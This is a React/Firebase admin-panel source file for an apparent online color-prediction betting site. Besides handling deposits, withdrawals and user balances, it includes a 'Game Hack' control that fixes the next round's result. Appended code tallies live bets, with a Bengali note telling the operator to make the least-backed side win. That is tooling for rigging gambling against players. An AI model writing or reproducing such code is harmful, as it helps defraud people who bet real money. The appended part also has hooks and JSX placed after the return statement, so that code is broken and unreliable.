"use client";
import { useState, useEffect } from 'react';
import { db, auth } from '@/firebase/config';
import { 
  collection, onSnapshot, query, where, doc, updateDoc, 
  increment, getDocs, setDoc, deleteDoc, orderBy 
} from "firebase/firestore";

export default function SuperAdmin() {
  const [deposits, setDeposits] = useState([]);
  const [withdraws, setWithdraws] = useState([]);
  const [users, setUsers] = useState([]);
  const [nextRes, setNextRes] = useState({ number: 0, color: 'Red', size: 'Small' });
  const [siteNotice, setSiteNotice] = useState("");

  // ১. সব ডাটা লোড করা
  useEffect(() => {
    onSnapshot(query(collection(db, "deposits"), where("status", "==", "pending")), (s) => 
      setDeposits(s.docs.map(d => ({ id: d.id, ...d.data() }))));
    
    onSnapshot(query(collection(db, "withdrawals"), where("status", "==", "pending")), (s) => 
      setWithdraws(s.docs.map(d => ({ id: d.id, ...d.data() }))));

    onSnapshot(query(collection(db, "users"), orderBy("balance", "desc")), (s) => 
      setUsers(s.docs.map(d => ({ id: d.id, ...d.data() }))));
  }, []);

  // ২. পেমেন্ট কন্ট্রোল
  const managePayment = async (type, id, uid, amount, status) => {
    try {
      if (type === 'deposit' && status === 'success') {
        await updateDoc(doc(db, "users", uid), { balance: increment(amount) });
      }
      const folder = type === 'deposit' ? "deposits" : "withdrawals";
      await updateDoc(doc(db, folder, id), { status: status });
      alert("Action Successful!");
    } catch (e) { alert(e.message); }
  };

  // ৩. গেম রেজাল্ট ম্যানিপুলেশন (অ্যাডমিন যা চাবে তাই হবে)
  const setGameResult = async () => {
    try {
      await setDoc(doc(db, "game_settings", "next_result"), nextRes);
      alert("Next Result Fixed!");
    } catch (e) { alert(e.message); }
  };

  // ৪. ইউজার ব্যালেন্স এডিট (কাস্টম ব্যালেন্স অ্যাড/রিমুভ)
  const editUserBalance = async (uid, amt) => {
    const newAmt = prompt("Enter amount to add (use minus to deduct):", "0");
    if (newAmt) {
      await updateDoc(doc(db, "users", uid), { balance: increment(Number(newAmt)) });
      alert("Balance Updated!");
    }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-white p-4 font-sans space-y-8 pb-20">
      <header className="py-6 border-b border-yellow-500/20">
        <h1 className="text-2xl font-black text-yellow-500 italic uppercase">Super Admin Panel</h1>
        <p className="text-[10px] text-gray-500">Control everything from here</p>
      </header>

      {/* --- RESULT CONTROL (Game Hack) --- */}
      <section className="bg-[#111622] p-6 rounded-3xl border border-blue-500/20 shadow-xl">
        <h2 className="text-sm font-bold text-blue-400 mb-4 uppercase">Control Next Result</h2>
        <div className="grid grid-cols-3 gap-2 mb-4">
          <input type="number" placeholder="Num" className="bg-black p-3 rounded-xl outline-none text-yellow-500" 
            onChange={(e) => setNextRes({...nextRes, number: e.target.value, size: e.target.value >= 5 ? 'Big' : 'Small'})} />
          <select className="bg-black p-3 rounded-xl outline-none" onChange={(e) => setNextRes({...nextRes, color: e.target.value})}>
            <option value="Red">Red</option>
            <option value="Green">Green</option>
            <option value="Violet">Violet</option>
          </select>
          <button onClick={setGameResult} className="bg-blue-600 rounded-xl font-bold text-xs">FIX RESULT</button>
        </div>
      </section>

      {/* --- PENDING DEPOSITS --- */}
      <section className="space-y-4">
        <h2 className="text-sm font-bold text-green-500 uppercase px-2">Pending Deposits ({deposits.length})</h2>
        {deposits.map(d => (
          <div key={d.id} className="bg-[#111622] p-4 rounded-2xl border border-gray-800 flex justify-between items-center">
            <div>
              <p className="font-bold">৳{d.amount} <span className="text-[10px] text-gray-500">({d.method})</span></p>
              <p className="text-[10px] font-mono text-yellow-500">{d.trxId}</p>
            </div>
            <div className="flex gap-2">
              <button onClick={() => managePayment('deposit', d.id, d.uid, d.amount, 'success')} className="bg-green-600 px-3 py-1.5 rounded-lg text-[10px] font-bold">Approve</button>
              <button onClick={() => managePayment('deposit', d.id, d.uid, d.amount, 'rejected')} className="bg-red-600 px-3 py-1.5 rounded-lg text-[10px] font-bold">Reject</button>
            </div>
          </div>
        ))}
      </section>

      {/* --- PENDING WITHDRAWS --- */}
      <section className="space-y-4">
        <h2 className="text-sm font-bold text-red-500 uppercase px-2">Pending Withdraws ({withdraws.length})</h2>
        {withdraws.map(w => (
          <div key={w.id} className="bg-[#111622] p-4 rounded-2xl border border-gray-800 flex justify-between items-center">
            <div>
              <p className="font-bold text-red-400">৳{w.amount}</p>
              <p className="text-[10px] text-gray-400">Phone: {w.phone}</p>
            </div>
            <button onClick={() => managePayment('withdraw', w.id, w.uid, w.amount, 'success')} className="bg-blue-600 px-4 py-2 rounded-lg text-[10px] font-bold">Mark Paid</button>
          </div>
        ))}
      </section>

      {/* --- USER MANAGEMENT --- */}
      <section className="space-y-4">
        <h2 className="text-sm font-bold text-gray-400 uppercase px-2">User Management ({users.length})</h2>
        <div className="overflow-hidden rounded-2xl border border-gray-800">
          <table className="w-full text-[10px] bg-[#111622] text-left">
            <thead className="bg-[#1a2035] text-gray-500 uppercase">
              <tr>
                <th className="p-3">User</th>
                <th className="p-3">Balance</th>
                <th className="p-3">Action</th>
              </tr>
            </thead>
            <tbody>
              {users.map(u => (
                <tr key={u.id} className="border-t border-gray-800">
                  <td className="p-3 truncate max-w-[80px]">{u.phone || u.email || u.id}</td>
                  <td className="p-3 text-yellow-500 font-bold">৳{u.balance?.toFixed(1)}</td>
                  <td className="p-3">
                    <button onClick={() => editUserBalance(u.id)} className="bg-gray-700 px-2 py-1 rounded text-[8px]">EDIT</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </section>
    </div>
  );

  const [liveBets, setLiveBets] = useState({ Green: 0, Red: 0, Violet: 0, Big: 0, Small: 0 });

useEffect(() => {
  // বর্তমান পিরিয়ডের লাইভ বেটগুলো ট্র্যাক করা
  const q = query(collection(db, "current_bets"), where("status", "==", "pending"));
  const unsub = onSnapshot(q, (snap) => {
    let totals = { Green: 0, Red: 0, Violet: 0, Big: 0, Small: 0 };
    snap.forEach(doc => {
      const data = doc.data();
      if (totals[data.selection] !== undefined) {
        totals[data.selection] += data.amount;
      }
    });
    setLiveBets(totals);
  });
  return () => unsub();
}, []);

// UI-তে দেখানোর জন্য:
<section className="bg-[#111622] p-6 rounded-3xl border border-yellow-500/20 shadow-xl">
  <h2 className="text-sm font-bold text-yellow-500 mb-4 uppercase flex items-center gap-2">
    <span className="w-2 h-2 bg-red-500 rounded-full animate-ping"></span> Live Bet Monitoring
  </h2>
  <div className="grid grid-cols-2 gap-4 text-xs">
    <div className="bg-black/40 p-3 rounded-xl border border-green-900/30">
      <p className="text-green-500">Green: ৳{liveBets.Green}</p>
    </div>
    <div className="bg-black/40 p-3 rounded-xl border border-red-900/30">
      <p className="text-red-500">Red: ৳{liveBets.Red}</p>
    </div>
    <div className="bg-black/40 p-3 rounded-xl border border-orange-900/30">
      <p className="text-orange-500">Big: ৳{liveBets.Big}</p>
    </div>
    <div className="bg-black/40 p-3 rounded-xl border border-blue-900/30">
      <p className="text-blue-500">Small: ৳{liveBets.Small}</p>
    </div>
  </div>
  <p className="text-[9px] text-gray-500 mt-4 italic">* যেদিকে টাকা কম পড়েছে, সেটিকে উইনার বানিয়ে দিন।</p>
</section>